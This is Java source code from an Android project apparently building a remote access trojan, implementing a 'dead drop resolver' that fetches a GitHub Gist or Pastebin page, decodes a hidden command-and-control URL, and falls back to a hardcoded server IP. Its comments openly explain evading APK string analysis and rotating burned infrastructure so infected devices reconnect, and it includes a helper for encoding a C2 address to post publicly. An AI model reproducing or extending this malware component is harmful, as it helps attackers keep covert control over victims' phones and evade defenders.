package com.example.reverseshell2;

import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Dead Drop Resolver (DDR) — resolves C2 server address at runtime.
 * 
 * The APK NEVER contains the real C2 IP. Instead:
 * 1. Fetches a public page (GitHub Gist, Pastebin, etc.)
 * 2. Extracts an encoded string from the page content
 * 3. Decodes/decrypts it to get the current C2 URL
 * 
 * This means:
 * - Extracting strings from the APK reveals NO C2 information
 * - C2 can be rotated without updating the APK
 * - If VPS is burned, update the Gist and all devices reconnect
 * 
 * DDR Locations (in priority order):
 * 1. GitHub Gist — high reputation, rarely blocked
 * 2. Pastebin — alternate fallback
 * 3. Hardcoded IP — last resort fallback
 */
public class DeadDropResolver {

    private static final String TAG = "SYS_DDR";

    // DDR sources — public URLs that contain the encoded C2 address
    // The attacker updates these to rotate C2 infrastructure
    private static final String[] DDR_URLS = {
        "https://gist.githubusercontent.com/raw/GIST_ID_HERE",
        // Add more fallback DDR URLs here
    };

    // Obfuscation key for decoding the C2 address from the DDR
    // In production, derive this from device-specific values
    private static final String DDR_KEY = "AnDr0R4T_2026_K3Y"; // 18 chars, padded to 16 for AES

    // Fallback IP if all DDR sources fail
    private static final String FALLBACK_URL = "http://" + config.serverIP + ":8080";

    // Cache the resolved URL for the session
    private static String cachedUrl = null;
    private static long cacheExpiry = 0;
    private static final long CACHE_DURATION_MS = 30 * 60 * 1000; // 30 minutes

    /**
     * Resolve the current C2 server URL.
     * Tries DDR sources first, falls back to hardcoded IP.
     */
    public static String resolveC2Url() {
        // Return cached URL if still valid
        if (cachedUrl != null && System.currentTimeMillis() < cacheExpiry) {
            return cachedUrl;
        }

        // Try each DDR source
        for (String ddrUrl : DDR_URLS) {
            try {
                String resolved = fetchAndDecode(ddrUrl);
                if (resolved != null && !resolved.isEmpty()) {
                    cachedUrl = resolved;
                    cacheExpiry = System.currentTimeMillis() + CACHE_DURATION_MS;
                    Log.d(TAG, "C2 resolved via DDR: " + maskUrl(resolved));
                    return resolved;
                }
            } catch (Exception e) {
                Log.d(TAG, "DDR source failed: " + e.getMessage());
            }
        }

        // All DDR sources failed — use hardcoded fallback
        Log.d(TAG, "All DDR sources failed, using fallback");
        cachedUrl = FALLBACK_URL;
        cacheExpiry = System.currentTimeMillis() + (5 * 60 * 1000); // Shorter cache for fallback
        return FALLBACK_URL;
    }

    /**
     * Fetch DDR page and decode the C2 address.
     * 
     * Expected format on the DDR page:
     * Any text... [DDR_START]base64_encoded_encrypted_url[DDR_END] ...any text
     * 
     * This allows the Gist/paste to contain normal-looking content
     * with the C2 address hidden in markers.
     */
    private static String fetchAndDecode(String ddrUrl) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(ddrUrl).openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");

        int code = conn.getResponseCode();
        if (code != 200) {
            conn.disconnect();
            return null;
        }

        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        br.close();
        conn.disconnect();

        String content = sb.toString();

        // Method 1: Look for markers [DDR_START]...[DDR_END]
        int start = content.indexOf("[DDR_START]");
        int end = content.indexOf("[DDR_END]");
        if (start >= 0 && end > start) {
            String encoded = content.substring(start + 11, end).trim();
            return decodeC2(encoded);
        }

        // Method 2: The entire content is the encoded URL (raw Gist)
        String trimmed = content.trim();
        if (trimmed.length() < 500) { // Sanity check — shouldn't be too long
            return decodeC2(trimmed);
        }

        return null;
    }

    /**
     * Decode the C2 URL from the DDR payload.
     * 
     * Encoding scheme (choose based on threat model):
     * - Simple: Base64 encoded URL
     * - Medium: Base64 → XOR with key
     * - Advanced: Base64 → AES-128 decrypt
     */
    private static String decodeC2(String encoded) {
        try {
            // Try Base64 decode first (simple mode)
            byte[] decoded = Base64.decode(encoded, Base64.DEFAULT);
            String url = new String(decoded, "UTF-8");

            // Validate it looks like a URL
            if (url.startsWith("http://") || url.startsWith("https://")) {
                return url;
            }

            // Try XOR decode (medium mode)
            byte[] xored = xorDecode(decoded, DDR_KEY.getBytes());
            url = new String(xored, "UTF-8");
            if (url.startsWith("http://") || url.startsWith("https://")) {
                return url;
            }

        } catch (Exception e) {
            Log.d(TAG, "Decode failed: " + e.getMessage());
        }
        return null;
    }

    private static byte[] xorDecode(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }

    /**
     * Mask URL for logging (don't leak full C2 address in logcat)
     */
    private static String maskUrl(String url) {
        if (url.length() > 20) {
            return url.substring(0, 15) + "...";
        }
        return url;
    }

    /**
     * Utility: Encode a C2 URL for placing on the DDR page.
     * Run this on your local machine to generate the DDR payload.
     * 
     * Usage: DeadDropResolver.encodeForDDR("http://159.65.147.39:8080")
     * Then paste the output into your GitHub Gist.
     */
    public static String encodeForDDR(String c2Url) {
        return Base64.encodeToString(c2Url.getBytes(), Base64.NO_WRAP);
    }
}
